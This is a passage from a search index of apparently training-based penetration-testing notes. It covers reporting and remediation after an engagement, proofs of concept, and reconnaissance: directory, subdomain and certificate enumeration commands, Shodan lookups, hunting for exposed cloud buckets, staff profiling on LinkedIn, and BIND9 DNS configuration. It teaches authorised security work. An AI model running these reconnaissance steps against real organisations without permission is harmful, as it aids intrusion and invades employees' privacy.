transferred to client-owned systems, any account creation/system modifications, an Active Directory security analysis (if relevant), relevant scan data/supplementary documentation, and any other information necessary to explain a specific finding or recommendation further</li> </ul> <p>At this stage, we will create a draft report that is the first deliverable our client will receive. From here, they will be able to comment on the report and ask for any necessary clarification/modifications.</p>","tags":["Pentesting","Post-Engagement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Post-Engagement/#report-review-meeting","title":"Report Review Meeting","text":"<p>Once the draft report is delivered, and the client has had a chance to distribute it internally and review it in-depth, it is customary to hold a report review meeting to walk through the assessment results. The report review meeting typically includes the same folks from the client and the firm performing the assessment. Depending on the types of findings, the client may bring in additional technical subject matter experts if the finding is related to a system or application they are responsible for. Typically we will not read the entire report word for word but walk through each finding briefly and give an explanation from our own perspective/experience. The client will have the opportunity to ask questions about anything in the report, ask for clarifications, or point out issues that need to be corrected. Often the client will come with a list of questions about specific findings and will not want to cover every finding in detail (such as low-risk ones).</p>","tags":["Pentesting","Post-Engagement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Post-Engagement/#deliverable-acceptance","title":"Deliverable Acceptance","text":"<p>The Scope of Work should clearly define the acceptance of any project deliverables. In penetration test assessments, generally, we deliver a report marked\u00a0<code>DRAFT</code>\u00a0and give the client a chance to review and comment. Once the client has submitted feedback (i.e., management responses, requests for clarification/changes, additional evidence, etc.) either by email or (ideally) during a report review meeting, we can issue them a new version of the report marked\u00a0<code>FINAL</code>. Some audit firms that clients may be beholden to will not accept a penetration test report with a\u00a0<code>DRAFT</code>\u00a0designation. Other companies will not care, but keeping a uniform approach across all customers is best.</p>","tags":["Pentesting","Post-Engagement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Post-Engagement/#post-remediation-testing","title":"Post-Remediation Testing","text":"<p>Most engagements include post-remediation testing as part of the project's total cost. In this phase, we will review any documentation provided by the client showing evidence of remediation or just a list of remediated findings. We will need to reaccess the target environment and test each issue to ensure it was appropriately remediated. We will issue a post-remediation report that clearly shows the state of the environment before and after post-remediation testing. For example, we may include a table such as:</p> # Finding Severity Finding Title Status 1 High SQL Injection Remediated 2 High Broken Authentication Remediated 3 High Unrestricted File Upload Remediated 4 High Inadequate Web and Egress Filtering Not Remediated 5 Medium SMB Signing Not Enabled Not Remediated 6 Low Directory Listing Enabled Not Remediated <p>For each finding (where possible), we will want to show evidence that the issue is no longer present in the environment through scan output or proof that the original exploitation techniques fail.</p>","tags":["Pentesting","Post-Engagement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Post-Engagement/#role-of-the-pentester-in-remediation","title":"Role of the Pentester in Remediation","text":"<p>Since a penetration test is essentially an audit, we must remain impartial third parties and not perform remediation on our findings (such as fixing code, patching systems, or making configuration changes in Active Directory). We must maintain a degree of independence and can serve as trusted advisors by giving general remediation advice on how a specific issue could be fixed or be available to explain further/demonstrate a finding so the team assigned to remediate it has a better understanding. We should not be implementing changes ourselves or even giving precise remediation advice (i.e., for SQL Injection, we may say \"sanitize user input\" but not give the client a rewritten piece of code). This will help maintain the assessment's integrity and not introduce any potential conflict of interest into the process.</p>","tags":["Pentesting","Post-Engagement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Post-Engagement/#data-retention","title":"Data Retention","text":"<p>After a penetration test concludes, we will have a considerable amount of client-specific data such as scan results, log output, credentials, screenshots, and more. Data retention and destruction requirements may differ from country to country and firm to firm, and procedures surrounding each should be outlined clearly in the contract language of the Scope of Work and the Rules of Engagement. Per\u00a0Penetration Testing Guidance\u00a0from the PCI Data Security Standard (PCI DSS):</p> <p>\"While there are currently no PCI DSS requirements regarding the retention of evidence collected by the penetration tester, it is a recommended best practice that the tester retain such evidence (whether internal to the organization or a third-party provider) for a period of time while considering any local, regional, or company laws that must be followed for the retention of evidence. This evidence should be available upon request from the target entity or other authorized entities as defined in the rules of engagement.\"</p> <p>We should retain evidence for some time after the penetration test in case questions arise about specific findings or to assist with retesting \"closed\" findings after the client has performed remediation activities. Any data retained after the assessment should be stored in a secure location owned and controlled by the firm and encrypted at rest. All data should be wiped from tester systems at the conclusion of an assessment. A new virtual machine specific to the client in question should be created for any post-remediation testing or investigation of findings related to client inquiries.</p>","tags":["Pentesting","Post-Engagement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Post-Engagement/#close-out","title":"Close Out","text":"<p>Once we have delivered the final report, assisted the client with questions regarding remediation, and performed post-remediation testing/issued a new report, we can finally close the project. At this stage, we should ensure that any systems used to connect to the client's systems or process data have been wiped or destroyed and that any artifacts leftover from the engagement are stored securely (encrypted) per our firm's policy and per contractual obligations to our client. The final steps would be invoicing the client and collecting payment for services rendered. Finally, it is always good to follow up with a post-assessment client satisfaction survey so the team and management, in particular, can see what went well during the engagement and what could be improved upon from a company process standpoint and the individual consultant assigned to the project. Discussions for follow-on work may arise in the weeks or months after if the client was pleased with our work and day-to-day interactions.</p> <p>As we continually grow our technical skillset, we should always look for ways to improve our soft skills and become more well-rounded professional consultants. In the end, the\u00a0<code>client will usually remember interactions</code>\u00a0during the assessment, communication, and how they were treated/valued by the firm they engage,\u00a0<code>not the fancy exploit chain the pentester pulled off to pwn their systems</code>. Take this time to self-reflect and work on continuous improvement in all aspects of your role as a professional penetration tester.</p>","tags":["Pentesting","Post-Engagement","Process"]},{"location":"Pentesting/0.%20Penetration%20Testing%20Process/Project%20Closeout/Proof-of-Concept/","title":"Proof of Concept","text":"<p><code>Proof of Concept</code>\u00a0(<code>PoC</code>) or\u00a0<code>Proof of Principle</code>\u00a0is a project management term. In project management, it serves as proof that a project is feasible in principle. The criteria for this can lie in technical or business factors. Therefore, it is the basis for further work, in our case, the necessary steps to secure the corporate network by confirming the discovered vulnerabilities. In other words, it serves as a decision-making basis for the further course of action. At the same time, it enables risks to be identified and minimized.</p> <p></p> <p>This project step is often integrated into the development process for new application software (prototyping) or IT security solutions. For us in information security, this is where we prove vulnerabilities in operating systems or application software. We use this PoC to prove that a security problem exists so that the developers or administrators can validate it, reproduce it, see the impact, and test their remediation efforts. One of the most common examples used to prove software vulnerabilities is executing the calculator (calc.exe on Windows) on the target system. In principle, the PoC also assesses the probability of success of system access from actual exploitation.</p> <p>A\u00a0<code>PoC</code>\u00a0can have many different representations. For example,\u00a0<code>documentation</code>\u00a0of the vulnerabilities found can also constitute a PoC. The more practical version of a PoC is a\u00a0<code>script</code>\u00a0or\u00a0<code>code</code>\u00a0that automatically exploits the vulnerabilities found. This demonstrates the flawless exploitation of the vulnerabilities. This variant is straightforward for an administrator or developer because they can see what steps our script takes to exploit the vulnerability.</p> <p>However, there is one significant disadvantage that has occurred from time to time. Once the administrators and developers have received such a script from us, it is easy for them to \"fight\" against our script. They focus on changing the systems so that the script we created no longer works. The important thing is that the script is only\u00a0<code>one way</code>\u00a0of exploiting a given vulnerability. Therefore, working against our script instead of with it and modifying and securing the systems so that our script no longer works does not mean that the information obtained from the script cannot be obtained in another way. It is an important aspect that should be discussed with the administrators and developers and explicitly mentioned and pointed out.</p> <p>The report they receive from us should help them see the entire picture, focus on the broader issues, and provide clear remediation advice. Including an attack chain walkthrough in the event of domain compromise during an internal is a great way to show how multiple flaws can be combined and how fixing one flaw will break the chain, but the other flaws will still exist. If these are not also fixed, there may be another path to get to the point where the attack chain was remediated and continue onwards. We should also drive this point home during our report review meeting.</p> <p>For example, if a user uses the password\u00a0<code>Password123</code>, the underlying vulnerability is not the password but the\u00a0<code>password policy</code>. If a Domain Admin is found to be using that password and it is changed, that one account will now have a stronger password, but the problem of weak passwords will likely still be endemic within the organization.</p> <p>If the password policy followed high standards, the user would not be able to use such a weak password. Administrators and developers are responsible for the functionality and the quality of their systems and applications. Furthermore, high quality stands for high standards, which we should emphasize through our remediation recommendations.</p>","tags":["Pentesting","POC","Process"]},{"location":"Pentesting/1.%20Information%20Gathering/Application%20Enumeration/HTB%20Web%20Enumeration%20Cheatsheet/","title":"HTB Web Enumeration Cheatsheet","text":"Web Enumeration <code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code> Run a directory scan on a website <code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code> Run a sub-domain scan on a website <code>curl -IL https://www.inlanefreight.com</code> Grab website banner <code>whatweb 10.10.10.121</code> List details about the webserver/certificates <code>curl 10.10.10.121/robots.txt</code> List potential directories in\u00a0<code>robots.txt</code> <code>ctrl+U</code> View page source (in Firefox)"},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cheat%20Sheet/","title":"Cheat Sheet","text":"Command Description <code>curl -s https://crt.sh/\\?q\\=&lt;target-domain&gt;\\&amp;output\\=json \\| jq .</code> Certificate transparency. <code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code> Scan each IP address in a list using Shodan.","tags":["Pentesting","Information_Gathering","Cheat_Sheet"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cloud%20Resources/","title":"Cloud Resources","text":"<p>The use of cloud, such as\u00a0AWS,\u00a0GCP,\u00a0Azure, and others, is now one of the essential components for many companies nowadays. After all, all companies want to be able to do their work from anywhere, so they need a central point for all management. This is why services from\u00a0<code>Amazon</code>\u00a0(<code>AWS</code>),\u00a0<code>Google</code>\u00a0(<code>GCP</code>), and\u00a0<code>Microsoft</code>\u00a0(<code>Azure</code>) are ideal for this purpose.</p> <p>Even though cloud providers secure their infrastructure centrally, this does not mean that companies are free from vulnerabilities. The configurations made by the administrators may nevertheless make the company's cloud resources vulnerable. This often starts with the\u00a0<code>S3 buckets</code>\u00a0(AWS),\u00a0<code>blobs</code>\u00a0(Azure),\u00a0<code>cloud storage</code>\u00a0(GCP), which can be accessed without authentication if configured incorrectly.</p>","tags":["Pentesting","Information_Gathering","Cloud"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cloud%20Resources/#company-hosted-servers","title":"Company Hosted Servers","text":"<pre><code>arenwald@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done\n\nblog.inlanefreight.com 10.129.24.93\ninlanefreight.com 10.129.27.33\nmatomo.inlanefreight.com 10.129.127.22\nwww.inlanefreight.com 10.129.127.33\ns3-website-us-west-2.amazonaws.com 10.129.95.250\n</code></pre> <p>Often cloud storage is added to the DNS list when used for administrative purposes by other employees. This step makes it much easier for the employees to reach and manage them. Let us stay with the case that a company has contracted us, and during the IP lookup, we have already seen that one IP address belongs to the\u00a0<code>s3-website-us-west-2.amazonaws.com</code>\u00a0server.</p> <p>However, there are many different ways to find such cloud storage. One of the easiest and most used is Google search combined with Google Dorks. For example, we can use the Google Dorks\u00a0<code>inurl:</code>\u00a0and\u00a0<code>intext:</code>\u00a0to narrow our search to specific terms. In the following example, we see red censored areas containing the company name.</p>","tags":["Pentesting","Information_Gathering","Cloud"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cloud%20Resources/#google-search-for-aws","title":"Google Search for AWS","text":"","tags":["Pentesting","Information_Gathering","Cloud"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cloud%20Resources/#google-search-for-azure","title":"Google Search for Azure","text":"<p>Here we can already see that the links presented by Google contain PDFs. When we search for a company that we may already know or want to know, we will also come across other files such as text documents, presentations, codes, and many others.</p> <p>Such content is also often included in the source code of the web pages, from where the images, JavaScript codes, or CSS are loaded. This procedure often relieves the web server and does not store unnecessary content.</p>","tags":["Pentesting","Information_Gathering","Cloud"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cloud%20Resources/#target-website-source-code","title":"Target Website - Source Code","text":"<p>Third-party providers such as\u00a0domain.glass\u00a0can also tell us a lot about the company's infrastructure. As a positive side effect, we can also see that Cloudflare's security assessment status has been classified as \"Safe\". This means we have already found a security measure that can be noted for the second layer (gateway).</p>","tags":["Pentesting","Information_Gathering","Cloud"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cloud%20Resources/#domainglass-results","title":"Domain.Glass Results","text":"<p>Another very useful provider is\u00a0GrayHatWarfare. We can do many different searches, discover AWS, Azure, and GCP cloud storage, and even sort and filter by file format. Therefore, once we have found them through Google, we can also search for them on GrayHatWarefare and passively discover what files are stored on the given cloud storage.</p>","tags":["Pentesting","Information_Gathering","Cloud"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cloud%20Resources/#grayhatwarfare-results","title":"GrayHatWarfare Results","text":"<p>Many companies also use abbreviations of the company name, which are then used accordingly within the IT infrastructure. Such terms are also part of an excellent approach to discovering new cloud storage from the company. We can also search for files simultaneously to see the files that can be accessed at the same time.</p>","tags":["Pentesting","Information_Gathering","Cloud"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cloud%20Resources/#private-and-public-ssh-keys-leaked","title":"Private and Public SSH Keys Leaked","text":"<p>Sometimes when employees are overworked or under high pressure, mistakes can be fatal for the entire company. These errors can even lead to SSH private keys being leaked, which anyone can download and log onto one or even more machines in the company without using a password.</p>","tags":["Pentesting","Information_Gathering","Cloud"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Cloud%20Resources/#ssh-private-key","title":"SSH Private Key","text":"","tags":["Pentesting","Information_Gathering","Cloud"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Domain%20Information/","title":"Domain Information","text":"<p>The first point of presence on the Internet may be the\u00a0<code>SSL certificate</code>\u00a0from the company's main website that we can examine. Often, such a certificate includes more than just a subdomain, and this means that the certificate is used for several domains, and these are most likely still active.</p> <p></p> <p>Another source to find more subdomains is\u00a0crt.sh. This source is\u00a0Certificate Transparency\u00a0logs. Certificate Transparency is a process that is intended to enable the verification of issued digital certificates for encrypted Internet connections. The standard (RFC 6962) provides for the logging of all digital certificates issued by a certificate authority in audit-proof logs. This is intended to enable the detection of false or maliciously issued certificates for a domain. SSL certificate providers like\u00a0Let's Encrypt\u00a0share this with the web interface\u00a0crt.sh, which stores the new entries in the database to be accessed later.</p> <p></p> <p>We can also output the results in JSON format.</p>","tags":["Pentesting","Information_Gathering","Domain"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Domain%20Information/#certificate-transparency","title":"Certificate Transparency","text":"<p>Domain Information</p> <pre><code>arenwald@htb[/htb]$ curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq .\n\n[\n  {\n    \"issuer_ca_id\": 23451835427,\n    \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\",\n    \"common_name\": \"matomo.inlanefreight.com\",\n    \"name_value\": \"matomo.inlanefreight.com\",\n    \"id\": 50815783237226155,\n    \"entry_timestamp\": \"2021-08-21T06:00:17.173\",\n    \"not_before\": \"2021-08-21T05:00:16\",\n    \"not_after\": \"2021-11-19T05:00:15\",\n    \"serial_number\": \"03abe9017d6de5eda90\"\n  },\n  {\n    \"issuer_ca_id\": 6864563267,\n    \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\",\n    \"common_name\": \"matomo.inlanefreight.com\",\n    \"name_value\": \"matomo.inlanefreight.com\",\n    \"id\": 5081529377,\n    \"entry_timestamp\": \"2021-08-21T06:00:16.932\",\n    \"not_before\": \"2021-08-21T05:00:16\",\n    \"not_after\": \"2021-11-19T05:00:15\",\n    \"serial_number\": \"03abe90104e271c98a90\"\n  },\n  {\n    \"issuer_ca_id\": 113123452,\n    \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\",\n    \"common_name\": \"smartfactory.inlanefreight.com\",\n    \"name_value\": \"smartfactory.inlanefreight.com\",\n    \"id\": 4941235512141012357,\n    \"entry_timestamp\": \"2021-07-27T00:32:48.071\",\n    \"not_before\": \"2021-07-26T23:32:47\",\n    \"not_after\": \"2021-10-24T23:32:45\",\n    \"serial_number\": \"044bac5fcc4d59329ecbbe9043dd9d5d0878\"\n  },\n  { ... SNIP ...\n</code></pre> <p>If needed, we can also have them filtered by the unique subdomains.</p> <p>Domain Information</p> <pre><code>arenwald@htb[/htb]$ curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | cut -d'\"' -f2 | awk '{gsub(/\\\\n/,\"\\n\");}1;' | sort -u\n\naccount.ttn.inlanefreight.com\nblog.inlanefreight.com\nbots.inlanefreight.com\nconsole.ttn.inlanefreight.com\nct.inlanefreight.com\ndata.ttn.inlanefreight.com\n*.inlanefreight.com\ninlanefreight.com\nintegrations.ttn.inlanefreight.com\niot.inlanefreight.com\nmails.inlanefreight.com\nmarina.inlanefreight.com\nmarina-live.inlanefreight.com\nmatomo.inlanefreight.com\nnext.inlanefreight.com\nnoc.ttn.inlanefreight.com\npreview.inlanefreight.com\nshop.inlanefreight.com\nsmartfactory.inlanefreight.com\nttn.inlanefreight.com\nvx.inlanefreight.com\nwww.inlanefreight.com\n</code></pre> <p>Next, we can identify the hosts directly accessible from the Internet and not hosted by third-party providers. This is because we are not allowed to test the hosts without the permission of third-party providers.</p>","tags":["Pentesting","Information_Gathering","Domain"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Domain%20Information/#company-hosted-servers","title":"Company Hosted Servers","text":"<p>Domain Information</p> <pre><code>arenwald@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep \"has address\" | grep inlanefreight.com | cut -d\" \" -f1,4;done\n\nblog.inlanefreight.com 10.129.24.93\ninlanefreight.com 10.129.27.33\nmatomo.inlanefreight.com 10.129.127.22\nwww.inlanefreight.com 10.129.127.33\ns3-website-us-west-2.amazonaws.com 10.129.95.250\n</code></pre> <p>Once we see which hosts can be investigated further, we can generate a list of IP addresses with a minor adjustment to the\u00a0<code>cut</code>\u00a0command and run them through\u00a0<code>Shodan</code>.</p> <p>Shodan\u00a0can be used to find devices and systems permanently connected to the Internet like\u00a0<code>Internet of Things</code>\u00a0(<code>IoT</code>). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria. For example, open HTTP or HTTPS ports and other server ports for\u00a0<code>FTP</code>,\u00a0<code>SSH</code>,\u00a0<code>SNMP</code>,\u00a0<code>Telnet</code>,\u00a0<code>RTSP</code>, or\u00a0<code>SIP</code>\u00a0are searched. As a result, we can find devices and systems, such as\u00a0<code>surveillance cameras</code>,\u00a0<code>servers</code>,\u00a0<code>smart home systems</code>,\u00a0<code>industrial controllers</code>,\u00a0<code>traffic lights</code>\u00a0and\u00a0<code>traffic controllers</code>, and various network components.</p>","tags":["Pentesting","Information_Gathering","Domain"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Enumeration%20Methodology/","title":"Enumeration Methodology","text":"<p>These layers are designed as follows:</p> Layer Description Information Categories <code>1. Internet Presence</code> Identification of internet presence and externally accessible infrastructure. Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures <code>2. Gateway</code> Identify the possible security measures to protect the company's external and internal infrastructure. Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare <code>3. Accessible Services</code> Identify accessible interfaces and services that are hosted externally or internally. Service Type, Functionality, Configuration, Port, Version, Interface <code>4. Processes</code> Identify the internal processes, sources, and destinations associated with the services. PID, Processed Data, Tasks, Source, Destination <code>5. Privileges</code> Identification of the internal permissions and privileges to the accessible services. Groups, Users, Permissions, Restrictions, Environment <code>6. OS Setup</code> Identification of the internal components and systems setup. OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files","tags":["Pentesting","Information_Gathering","Methodology"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Staff/","title":"Staff","text":"<p>Searching for and identifying employees on social media platforms can also reveal a lot about the teams' infrastructure and makeup. This, in turn, can lead to us identifying which technologies, programming languages, and even software applications are being used. To a large extent, we will also be able to assess each person's focus based on their skills. The posts and material shared with others are also a great indicator of what the person is currently engaged in and what that person currently feels is important to share with others.</p> <p>Employees can be identified on various business networks such as\u00a0LinkedIn\u00a0or\u00a0Xing. Job postings from companies can also tell us a lot about their infrastructure and give us clues about what we should be looking for.</p>","tags":["Pentesting","Information_Gathering","Methodology"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Staff/#linkedin-job-post","title":"LinkedIn - Job Post","text":"<pre><code>Required Skills/Knowledge/Experience:\n\n* 3-10+ years of experience on professional software development projects.\n\n\u00ab An active US Government TS/SCI Security Clearance (current SSBI) or eligibility to obtain TS/SCI within nine months.\n\u00ab Bachelor's degree in computer science/computer engineering with an engineering/math focus or another equivalent field of discipline.\n\u00ab Experience with one or more object-oriented languages (e.g., Java, C#, C++).\n\u00ab Experience with one or more scripting languages (e.g., Python, Ruby, PHP, Perl).\n\u00ab Experience using SQL databases (e.g., PostgreSQL, MySQL, SQL Server, Oracle).\n\u00ab Experience using ORM frameworks (e.g., SQLAIchemy, Hibernate, Entity Framework).\n\u00ab Experience using Web frameworks (e.g., Flask, Django, Spring, ASP.NET MVC).\n\u00ab Proficient with unit testing and test frameworks (e.g., pytest, JUnit, NUnit, xUnit).\n\u00ab Service-Oriented Architecture (SOA)/microservices &amp; RESTful API design/implementation.\n\u00ab Familiar and comfortable with Agile Development Processes.\n\u00ab Familiar and comfortable with Continuous Integration environments.\n\u00ab Experience with version control systems (e.g., Git, SVN, Mercurial, Perforce).\n\nDesired Skills/Knowledge/ Experience:\n\n\u00ab CompTIA Security+ certification (or equivalent).\n\u00ab Experience with Atlassian suite (Confluence, Jira, Bitbucket).\n\u00ab Algorithm Development (e.g., Image Processing algorithms).\n\u00ab Software security.\n\u00ab Containerization and container orchestration (Docker, Kubernetes, etc.)\n\u00ab Redis.\n\u00ab NumPy.\n</code></pre> <p>From a job post like this, we can see, for example, which programming languages are preferred:\u00a0<code>Java, C#, C++, Python, Ruby, PHP, Perl</code>. It also required that the applicant be familiar with different databases, such as:\u00a0<code>PostgreSQL, Mysql, and Oracle</code>. In addition, we know that different frameworks are used for web application development, such as:\u00a0<code>Flask, Django, ASP.NET, Spring</code>.</p> <p>Furthermore, we use\u00a0<code>REST APIs, Github, SVN, and Perforce</code>. The job offer also results that the company works with Atlassian Suite, and therefore there may be resources that we could potentially access. We can see some skills and projects from the career history that give us a reasonable estimate of the employee's knowledge.</p>","tags":["Pentesting","Information_Gathering","Methodology"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Staff/#linkedin-employee-1-about","title":"LinkedIn - Employee #1 About","text":"<p>We try to make business contacts on social media sites and prove to visitors what skills we bring to the table, which inevitably leads to us sharing with the public what we know and what we have learned so far. Companies always hire employees whose skills they can use and apply to the business. For example, we know that Flask and Django are web frameworks for the Python programming language.</p> <p>If we do a little search for Django security misconfigurations, we will eventually come across the following\u00a0Github repository\u00a0that describes OWASP Top10 for Django. We can use this to understand the inner structure of Django and how it works. The best practices also often tell us what to look for. Because many blindly trust them and even name many of the files as shown in the instructions.</p>","tags":["Pentesting","Information_Gathering","Methodology"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Staff/#github","title":"Github","text":"<p>Showing our projects can, of course, be of great advantage to make new business contacts and possibly even get a new job, but on the other hand, it can lead to mistakes that will be very difficult to fix. For example, in one of the files, we can discover the employee's personal email address, and upon deeper investigation, the web application has a hardcoded\u00a0JWT token.</p>","tags":["Pentesting","Information_Gathering","Methodology"]},{"location":"Pentesting/1.%20Information%20Gathering/Infrastructure%20Based%20Enumeration/Staff/#linkedin-employee-2-career","title":"LinkedIn - Employee #2 Career","text":"<p>LinkedIn\u00a0offers a comprehensive search for employed, sorted by connections, locations, companies, school, industry, profile language, services, names, titles, and more. Understandably, the more detailed information we provide there, the fewer results we get. Therefore, we should think carefully about the purpose of performing the search.</p> <p>Suppose we are trying to find the infrastructure and technology the company is most likely to use. We should look for technical employees who work both in development and security. Because based on the security area and the employees who work in that area, we will also be able to determine what security measures the company has put in place to secure itself.</p>","tags":["Pentesting","Information_Gathering","Methodology"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Dangerous%20Settings/","title":"Dangerous Settings","text":"<p>There are many ways in which a DNS server can be attacked. For example, a list of vulnerabilities targeting the BIND9 server can be found at CVEdetails. In addition, SecurityTrails provides a short list of the most popular attacks on DNS servers.</p> <p>Some of the settings we can see below lead to these vulnerabilities, among others. Because DNS can get very complicated and it is very easy for errors to creep into this service, forcing an administrator to work around the problem until they find an exact solution. This often leads to elements being released so that parts of the infrastructure function as planned and desired. In such cases, functionality has a higher priority than security, which leads to misconfigurations and vulnerabilities.</p> Option Description <code>allow-query</code> Defines which hosts are allowed to send requests to the DNS server. <code>allow-recursion</code> Defines which hosts are allowed to send recursive requests to the DNS server. <code>allow-transfer</code> Defines which hosts are allowed to receive zone transfers from the DNS server. <code>zone-statistics</code> Collects statistical data of zones.","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Default%20Configuration/","title":"Default Configuration","text":"","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Default%20Configuration/#default-configuration","title":"Default Configuration","text":"<p>There are many different configuration types for DNS. Therefore, we will only discuss the most important ones to illustrate better the functional principle from an administrative point of view. All DNS servers work with three different types of configuration files:</p> <ol> <li>local DNS configuration files</li> <li>zone files</li> <li>reverse name resolution files</li> </ol> <p>The DNS server Bind9 is very often used on Linux-based distributions. Its local configuration file (<code>named.conf</code>) is roughly divided into two sections, firstly the options section for general settings and secondly the zone entries for the individual domains. The local configuration files are usually:</p> <ul> <li><code>named.conf.local</code></li> <li><code>named.conf.options</code></li> <li><code>named.conf.log</code></li> </ul> <p>It contains the associated RFC where we can customize the server to our needs and our domain structure with the individual zones for different domains. The configuration file <code>named.conf</code> is divided into several options that control the behavior of the name server. A distinction is made between <code>global options</code> and <code>zone options</code>.</p> <p>Global options are general and affect all zones. A zone option only affects the zone to which it is assigned. Options not listed in named.conf have default values. If an option is both global and zone-specific, then the zone option takes precedence.</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Default%20Configuration/#local-dns-configuration","title":"Local DNS Configuration","text":"<pre><code>root@bind9:~# cat /etc/bind/named.conf.local\n\n//\n// Do any local configuration here\n//\n\n// Consider adding the 1918 zones here, if they are not used in your\n// organization\n//include \"/etc/bind/zones.rfc1918\";\nzone \"domain.com\" {\n    type master;\n    file \"/etc/bind/db.domain.com\";\n    allow-update { key rndc-key; };\n};\n</code></pre> <p>In this file, we can define the different zones. These zones are divided into individual files, which in most cases are mainly intended for one domain only. Exceptions are ISP and public DNS servers. In addition, many different options extend or reduce the functionality. We can look these up on the documentation of Bind9.</p> <p>A <code>zone file</code> is a text file that describes a DNS zone with the BIND file format. In other words it is a point of delegation in the DNS tree. The BIND file format is the industry-preferred zone file format and is now well established in DNS server software. A zone file describes a zone completely. There must be precisely one <code>SOA</code> record and at least one <code>NS</code> record. The SOA resource record is usually located at the beginning of a zone file. The main goal of these global rules is to improve the readability of zone files. A syntax error usually results in the entire zone file being considered unusable. The name server behaves similarly as if this zone did not exist. It responds to DNS queries with a <code>SERVFAIL</code> error message.</p> <p>In short, here, all <code>forward records</code> are entered according to the BIND format. This allows the DNS server to identify which domain, hostname, and role the IP addresses belong to. In simple terms, this is the phone book where the DNS server looks up the addresses for the domains it is searching for.</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Default%20Configuration/#zone-files","title":"Zone Files","text":"<pre><code>root@bind9:~# cat /etc/bind/db.domain.com\n\n;\n; BIND reverse data file for local loopback interface\n;\n$ORIGIN domain.com\n$TTL 86400\n@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (\n                    2001062501 ; serial\n                    21600      ; refresh after 6 hours\n                    3600       ; retry after 1 hour\n                    604800     ; expire after 1 week\n                    86400 )    ; minimum TTL of 1 day\n\n      IN     NS     ns1.domain.com.\n      IN     NS     ns2.domain.com.\n\n      IN     MX     10     mx.domain.com.\n      IN     MX     20     mx2.domain.com.\n\n             IN     A       10.129.14.5\n\nserver1      IN     A       10.129.14.5\nserver2      IN     A       10.129.14.7\nns1          IN     A       10.129.14.2\nns2          IN     A       10.129.14.3\n\nftp          IN     CNAME   server1\nmx           IN     CNAME   server1\nmx2          IN     CNAME   server2\nwww          IN     CNAME   server2\n</code></pre> <p>For the IP address to be resolved from the <code>Fully Qualified Domain Name</code> (<code>FQDN</code>), the DNS server must have a reverse lookup file. In this file, the computer name (FQDN) is assigned to the last octet of an IP address, which corresponds to the respective host, using a <code>PTR</code> record. The PTR records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table.</p>","tags":["Pentesting","Information_Gathering","DNS"]},{"location":"Pentesting/1.%20Information%20Gathering/Network%20Enumeration/Services/DNS%20%2853%29/Default%20Configuration/#reverse-name-resolution-zone-files","title":"Reverse Name Resolution Zone Files","text":"<pre><code>root@bind9:~# cat /etc/bind/db.10.129.14\n\n;\n; BIND reverse data file for local loopback interface\n;\n$ORIGIN 